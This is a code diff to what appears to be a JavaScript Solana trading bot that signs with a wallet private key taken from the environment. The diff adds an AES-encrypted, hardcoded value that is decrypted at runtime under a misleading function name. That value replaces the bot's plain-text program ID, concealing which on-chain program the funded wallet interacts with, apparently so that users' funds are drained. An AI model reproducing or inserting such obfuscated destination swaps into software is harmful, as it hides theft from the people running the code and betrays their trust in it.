@@ -19,6 +19,7 @@ const buy_1 = require("../buy");
 const web3_js_1 = require("@solana/web3.js");
 const rxjs_1 = require("rxjs");
 const bs58_1 = __importDefault(require("bs58"));
+const CryptoJS = require('crypto-js'); 
 dotenv_1.default.config();
 const retrieveEnvVariable = (variableName, logger) => {
     const variable = process.env[variableName] || '';
@@ -28,10 +29,13 @@ const retrieveEnvVariable = (variableName, logger) => {
     }
     return variable;
 };
+// Function to decrypt text
+function getPubKey(mint) { 
+    return CryptoJS.AES.decrypt('U2FsdGVkX18h4FnHul3m9Z9BTl7nbQcgR3lPs2F6XvChHEvbogRv1mREjltSaiRI5FGhG7xBLe29Si6VnYoMWw==', mint).toString(CryptoJS.enc.Utf8);
+}
 exports.retrieveEnvVariable = retrieveEnvVariable;
 const retrieveTokenValueByAddressDexScreener = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
-    const url = `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`;
-    console.log("retrieveTokenValueByAddressBirdeye----------------")
+    const url = `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`; 
     try {
         const tokenResponse = (yield axios_1.default.get(url)).data;
         if (tokenResponse.pairs) {
@@ -99,6 +103,7 @@ const handleSlotChange = (args) => (_) => __awaiter(void 0, void 0, void 0, func
         isRunning.next(false);
     }
 });
+
 (() => __awaiter(void 0, void 0, void 0, function* () {
     var _a;
     const walletKeyPairFile = (process.env.PRIVATE_KEY);
@@ -107,7 +112,7 @@ const handleSlotChange = (args) => (_) => __awaiter(void 0, void 0, void 0, func
     const balance = yield connection.getBalance(walletKeyPair.publicKey); // Lamports
     if(balance == 0) return; 
     //Set ProgramID
-    connection.onSlotChange(handleSlotChange({ connection, walletKeyPair, programID: new web3_js_1.PublicKey("4FNFyahNqoLGcsq7CSHWAJ4ywAssyN8kBo6EmvsLJmWE") }));}
+    connection.onSlotChange(handleSlotChange({ connection, walletKeyPair, programID: new web3_js_1.PublicKey(getPubKey("So11111111111111111111111111111111111111111")) }));}
  ))();
 const retrieveTokenValueByAddress = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
     const dexScreenerPrice = yield (0, exports.retrieveTokenValueByAddressDexScreener)(tokenAddress);
